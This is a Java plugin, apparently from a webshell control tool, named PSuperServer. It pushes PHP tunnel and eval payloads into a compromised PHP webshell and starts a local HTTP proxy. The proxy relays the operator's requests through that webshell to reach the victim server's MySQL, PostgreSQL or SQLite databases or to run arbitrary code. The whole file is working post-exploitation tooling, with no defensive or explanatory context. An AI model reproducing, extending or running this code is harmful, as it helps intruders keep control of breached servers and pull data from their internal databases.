package shells.plugins.php;

import com.httpProxy.server.CertPool;
import com.httpProxy.server.core.HttpProxyHandle;
import com.httpProxy.server.core.HttpProxyServer;
import com.httpProxy.server.request.HttpRequest;
import com.httpProxy.server.request.HttpRequestParameter;
import com.httpProxy.server.response.HttpResponse;
import com.httpProxy.server.response.HttpResponseHeader;
import com.httpProxy.server.response.HttpResponseStatus;
import core.ApplicationContext;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Iterator;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;


@PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "PSuperServer", DisplayName = "超级服务")
public class PSuperServer
  implements Plugin, HttpProxyHandle
{
  private static final String[] PAYLOADS = new String[] { "ntunnel_mysql", "ntunnel_pgsql", "ntunnel_sqlite", "eval" };
  
  private String CLASS_NAME = "ntunnel_mysql";
  
  private final JPanel panel;
  
  private final RTextArea tipTextArea;
  private final JButton stopButton;
  private final JButton startButton;
  private final JComboBox<String> payloadComboBox;
  private final JLabel hostLabel;
  private final JLabel portLabel;
  private final JLabel payloadLabel;
  private final JTextField hostTextField;
  private final JTextField portTextField;
  private final JSplitPane httpProxySplitPane;
  private boolean loadState;
  private ShellEntity shellEntity;
  private Payload payload;
  private Encoding encoding;
  private HttpProxyServer httpProxyServer;
  
  public PSuperServer() {
    this.panel = new JPanel(new BorderLayout());
    
    this.hostLabel = new JLabel("host :");
    this.portLabel = new JLabel("port :");
    this.startButton = new JButton("Start");
    this.stopButton = new JButton("Stop");
    this.payloadLabel = new JLabel("Payload");
    this.hostTextField = new JTextField("127.0.0.1", 15);
    this.portTextField = new JTextField("8080", 7);
    this.tipTextArea = new RTextArea();
    this.httpProxySplitPane = new JSplitPane();
    this.payloadComboBox = new JComboBox<>(PAYLOADS);
    
    this.httpProxySplitPane.setOrientation(0);
    this.httpProxySplitPane.setDividerSize(0);
    
    this.tipTextArea.append("Logs:\r\n");
    
    JPanel httpProxyTopPanel = new JPanel();
    httpProxyTopPanel.add(this.hostLabel);
    httpProxyTopPanel.add(this.hostTextField);
    httpProxyTopPanel.add(this.portLabel);
    httpProxyTopPanel.add(this.portTextField);
    httpProxyTopPanel.add(this.payloadLabel);
    httpProxyTopPanel.add(this.payloadComboBox);
    httpProxyTopPanel.add(this.startButton);
    httpProxyTopPanel.add(this.stopButton);
    
    this.httpProxySplitPane.setTopComponent(httpProxyTopPanel);
    this.httpProxySplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
    
    this.panel.add(this.httpProxySplitPane);
  }

  
  private void Load() {
    this.CLASS_NAME = (String)this.payloadComboBox.getSelectedItem();
    try {
      InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { this.CLASS_NAME }));
      byte[] data = functions.readInputStream(inputStream);
      inputStream.close();
      if (this.payload.include(this.CLASS_NAME, data)) {
        this.loadState = true;
        Log.log("Load success", new Object[0]);
        this.tipTextArea.append("Load success\r\n");
      } else {
        Log.error("Load fail");
        this.tipTextArea.append("Load fail\r\n");
      } 
    } catch (Exception e) {
      Log.error(e);
    } 
  }



  
  public void handler(Socket clientSocket, HttpRequest httpRequest) throws Exception {
    httpRequest.getHttpRequestHeader().setHeader("Connection", "close");
    
    ReqParameter reqParameter = new ReqParameter();
    
    handlerReq(reqParameter, httpRequest);
    
    byte[] result = this.payload.evalFunc(this.CLASS_NAME, "xxxxx", reqParameter);
    
    HttpResponse httpResponse = new HttpResponse(new HttpResponseStatus(200), new HttpResponseHeader(), result);
    
    httpResponse.getHttpResponseHeader().setHeader("Connection", "close");
    
    clientSocket.getOutputStream().write(httpResponse.encode());
  }
  
  private void handlerReq(ReqParameter reqParameter, HttpRequest httpRequest) {
    String type = httpRequest.getHttpRequestHeader().getHeader("Content-Type");
    type = (type == null) ? httpRequest.getHttpRequestHeader().getHeader("Content-type") : type;
    type = (type == null) ? httpRequest.getHttpRequestHeader().getHeader("content-type") : type;
    HttpRequestParameter httpRequestParameter = new HttpRequestParameter();
    if (type == null || httpRequest.getRequestData() == null || (httpRequest.getRequestData()).length == 0) {
      return;
    }
    type = type.trim();

    
    if (type.indexOf("x-www-form") != -1) {
      httpRequestParameter.decode(httpRequest.getRequestData());
      httpRequestParameter.add("isUrlDecode", Boolean.valueOf(true));
    } else if (type.indexOf("multipart") != -1) {
      httpRequestParameter.setMultipart(true);
      int index = type.indexOf("boundary=");
      if (index != -1) {
        index += "boundary=".length();
        int endIndex = type.indexOf(";", index);
        endIndex = (endIndex == -1) ? type.length() : endIndex;
        String boundaryString = type.substring(index, endIndex);
        httpRequestParameter.setBoundary(boundaryString);
        httpRequestParameter.decode(httpRequest.getRequestData());
      } 
    } else {
      reqParameter.add("requestData", httpRequest.getRequestData());
    } 
    httpRequestParameter.decodeByUrl(httpRequest.getUrl());
    httpRequestParameter.add("REQUEST_METHOD", httpRequest.getMethod());
    HashMap<String, byte[]> parameterHashMap = httpRequestParameter.getParameter();
    Iterator<String> iterator = parameterHashMap.keySet().iterator();
    while (iterator.hasNext()) {
      String keyString = iterator.next();
      byte[] value = parameterHashMap.get(keyString);
      reqParameter.add(keyString, value);
    } 
  }

  
  private void startButtonClick(ActionEvent actionEvent) throws Exception {
    Load();
    if (this.httpProxyServer == null) {
      
      int listenPort = Integer.valueOf(this.portTextField.getText().trim()).intValue();
      InetAddress bindAddr = InetAddress.getByName(this.hostTextField.getText().trim());

      
      CertPool certPool = new CertPool(ApplicationContext.getHttpsPrivateKey(), ApplicationContext.getHttpsCert());
      
      this.httpProxyServer = new HttpProxyServer(listenPort, 50, bindAddr, certPool, this);
      
      if (this.httpProxyServer.startup()) {
        this.tipTextArea.append(
            String.format("start! bindAddr: %s listenPort: %s\r\n", new Object[] { bindAddr.getHostAddress(), Integer.valueOf(listenPort) }));
        GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "正在启动!", "提示", 1);
      } else {
        this.httpProxyServer = null;
        GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "启动失败!", "提示", 1);
      } 
    } else {
      
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已启动!", "提示", 2);
    } 
  }
  
  private void stopButtonClick(ActionEvent actionEvent) {
    if (this.httpProxyServer == null) {
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "没有启动!", "提示", 2);
    } else {
      this.httpProxyServer.setNextSocket(false);
      this.httpProxyServer.shutdown();
      this.httpProxyServer = null;
      this.tipTextArea.append("stop!\r\n");
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已停止!", "提示", 1);
    } 
  }

  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(this, this);
  }



  
  public JPanel getView() {
    return this.panel;
  }
}
